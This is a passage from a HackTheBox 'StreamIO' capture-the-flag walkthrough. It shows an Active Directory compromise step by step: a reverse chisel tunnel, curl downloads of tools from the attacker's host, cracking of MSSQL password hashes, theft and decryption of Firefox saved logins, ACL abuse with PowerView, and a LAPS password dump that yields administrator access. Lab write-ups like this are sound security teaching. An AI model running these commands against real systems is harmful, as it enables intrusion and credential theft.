**db_admin:B1@hx31234567890**



```bash
# Get chisel on server
curl http://10.10.14.132:5454/chisel64.exe -o chisel.exe

# On attack box
./chisel server -p 8000 --reverse

# On server
.\chisel.exe client 10.10.14.132:8000 R:1433:127.0.0.1:1433
```

With the server running we can use [mssqlclinet.py or sqsh](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#having-credentials) to access the server:

```bash
sqsh -S 127.0.0.1:1433 -U db_admin -P B1@hx31234567890 -D STREAMIO
1> SELECT name FROM master.dbo.sysdatabases;
2> go

SELECT * FROM master.INFORMATION_SCHEMA.TABLES;

SELECT * FROM streamio_backup.INFORMATION_SCHEMA.TABLES;

```

Master db has the same users that we obtained from the SQLi

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/5_2_master_db.png" width="50%"/>
</p>

But in the backup one we can see our target user:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/5_2_backup_db.png" width="50%"/>
</p>


```sql
1> use streamio_backup;
2> select * from users;
3> go

 	id  username  password             
 -----------
    1 nikk37 389d14cb8e4e9b94b137deb1caf0612a
    2 yoshihide b779ba15cedfd22a023c4d8bcf5f2332
    3 James c660060492d9edcaa8332d89c99c9239
    4 Theodore 925e5408ecb67aea449373d668b7359e
    5 Samantha 083ffae904143c4796e464dac33c1f7d
    6 Lauren 08344b85b329d7efd611b7a7743e8a09                                                                                       
    7 William d62be0dc82071bccc1322d64ec5b6c51                                                                                      
    8 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5
```

Let's crack again:

```bash
hashcat -a 0 -m 0 --user hash_backup.txt /usr/share/wordlists/rockyou.txt --show
```

```
nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/5_3_cracked.png" width="90%"/>
</p>


Now with the cracked users and passwords, we can try to log into the machine. Let's test the users with crackmapexec. nikk37 shows no pwned on smb, so it won't be administrator, but it has winrm enabled, so we can log in with it:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/5_4_cme.png" width="90%"/>
</p>


```bash
evil-winrm -i 10.10.11.158 -u nikk37 -p get_dem_girls2@yahoo.com
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/6_1_user.png" width="80%"/>
</p>




## Privesc

Let's download Winpeas on the machine for some kick inspection:

```bash
curl http://10.10.14.132:5454/Windows/winPEASany.exe -o win.exe
.\win.exe
```

We can see that there is a Firefox credential file, let's download it to check it on local:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/7_0_firefox.png" width="90%"/>
</p>


```bash
*Evil-WinRM* PS C:\Downloads> download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
```

(Don't be rude like me and use absolut paths on the destination machine, if not, you will have to rename the file)

We will also need the logins.json file and the complete ini folder for the tool we are using:

```bash
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> type logins.json
```

```json
{"nextId":5,"logins":[{"id":1,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECG2cZGM1+s+hBAiQvduUzZPkCw==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECKA5q3v2TxvuBBjtXIyW2UjOBvrg700JOU1yfrb0EnMRelw=","guid":"{9867a888-c468-4173-b2f4-329a1ec7fa60}","encType":1,"timeCreated":1645526456872,"timeLastUsed":1645526456872,"timePasswordChanged":1645526456872,"timesUsed":1},{"id":2,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDMUru7zbEb0BAiinvqXr8Trkg==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECOXW0KzZftfWBBARYsMPvSrUwx8+QfJdxzT+","guid":"{739bd2a5-5fec-4e08-97d2-3c619bf02be2}","encType":1,"timeCreated":1645526470377,"timeLastUsed":1645526470377,"timePasswordChanged":1645526470377,"timesUsed":1},{"id":3,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECPtpFUOBoOFABBDVCjdAdstUxzB6i9DCqvOw","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECCocciyfDsthBBDm3YSuhBsW3roo3l3zOUuF","guid":"{a98a87bc-86aa-489c-9227-d6579ab5148b}","encType":1,"timeCreated":1645526484137,"timeLastUsed":1645526484137,"timePasswordChanged":1645526484137,"timesUsed":1},{"id":4,"hostname":"https://slack.streamio.htb","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECB1j+gQdXzIuBAgO0o/N3J2MrQ==","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNt9zddW+/h7BBCBgoQVGaDQjF2IpeQEl/Td","guid":"{2be21548-7c50-42f0-8ef6-b33b1e77f150}","encType":1,"timeCreated":1645526511842,"timeLastUsed":1645526511842,"timePasswordChanged":1645526511842,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

```bash
download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json /home/kali/Desktop/HackTheBox/StreamIO/ini/logins.json

download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\cert9.db /home/kali/Desktop/HackTheBox/StreamIO/ini/cert9.db

download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\cookies.sqlite /home/kali/Desktop/HackTheBox/StreamIO/ini/cookies.sqlite
```

Then we can use [Firefox decrypt](https://github.com/Unode/firefox_decrypt) tool:

```bash
python3 firefox_decrypt.py /home/kali/Desktop/HackTheBox/StreamIO/ini
2022-08-19 14:45:44,614 - WARNING - profile.ini not found in /home/kali/Desktop/HackTheBox/StreamIO/ini
2022-08-19 14:45:44,614 - WARNING - Continuing and assuming '/home/kali/Desktop/HackTheBox/StreamIO/ini' is a profile location

Website:   https://slack.streamio.htb
Username: 'admin'
Password: 'JDg0dd1s@d0p3cr3@t0r'

Website:   https://slack.streamio.htb
Username: 'nikk37'
Password: 'n1kk1sd0p3t00:)'

Website:   https://slack.streamio.htb
Username: 'yoshihide'
Password: 'paddpadd@12'

Website:   https://slack.streamio.htb
Username: 'JDgodd'
Password: 'password@12'
```

We got many credentials, let's test them with crackmapexec:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/7_1_new_users.png" width="90%"/>
</p>


We have that the crads **JDgodd:JDg0dd1s@d0p3cr3@t0r** are valid on smb, no pwned, so it is not admin and we have no winrm to connect to the machine. Also, I cannot run commands as JDgodd on localhost, so better to start Bloodhound looking for some escalation path:


```bash
*Evil-WinRM* PS C:\Users\nikk37\Downloads> curl http://10.10.14.132:5454/SharpHound.ps1 -o SharpHound.ps1 
*Evil-WinRM* PS C:\Users\nikk37\Downloads> Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\nikk37\Downloads> Invoke-Bloodhound -CollectionMethod All -Domain streamio.htb -ZipFileName loot.zip
```

Once we have marked the users we owner, let's check the shortest path from each of them:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/8_1_bloodjdgod.png" width="80%"/>
</p>

The most obvious priv esc path is with user JDgodd since it has Read LAPS passwords over the DC. Looking for information about the attack, I found [this website](https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/) and a tool called [LAPSDumper](https://github.com/n00py/LAPSDumper). With crackmapexec could not login with any of the password for the JDgodd user.

```bash

# Create the credentials for our user
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)

# Set our user as Owner of that Group
Set-DomainObjectOwner -Identity 'Core Staff' -OwnerIdentity JDgodd -Cred $Cred

# Add ACL for Writing new members
Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'Core Staff' -Rights WriteMembers

# Add nikk37 to the group
Add-DomainGroupMember -Identity 'Core Staff' -Members nikk37 -Credential $Cred

```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/8_2_added.png" width="95%"/>
</p>


Now we can use LAPSDumper or CME (crackmapexec) to dump tha LAPS password:

```bash
python3 laps.py -u nikk37 -p get_dem_girls2@yahoo.com -d streamio.htb -l dc.streamio.htb
LAPS Dumper - Running at 09-29-2022 14:18:42
DC ,-96;;;dIO7dQ/

# Or use CME

crackmapexec ldap dc.streamio.htb -u nikk37 -p get_dem_girls2@yahoo.com -d streamio.htb -M laps
LDAP        10.10.11.158    389    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamio.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.158    389    DC               [+] streamio.htb\nikk37:get_dem_girls2@yahoo.com 
LAPS        10.10.11.158    389    DC               [*] Getting LAPS Passwords
LAPS        10.10.11.158    389    DC               Computer: DC$                  Password: ,-96;;;dIO7dQ/
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/9_0_cme.png" width="95%"/>
</p>


Now with evil-winrm we can connect as the admin, since the LAPS password will always have admin privileges:

```bash
evil-winrm -i 10.10.11.158 -u administrator -p ',-96;;;dIO7dQ/'
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/9_1_root.png" width="90%"/>
</p>

And the flag is on the Martin user:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/streamio/9_2_martin.png" width="70%"/>
</p>


That's all! Very great box, a lot of stuff combined to retreive the different flags. Also great approach for AD privesc beginners.
Hope you liked the writeup!
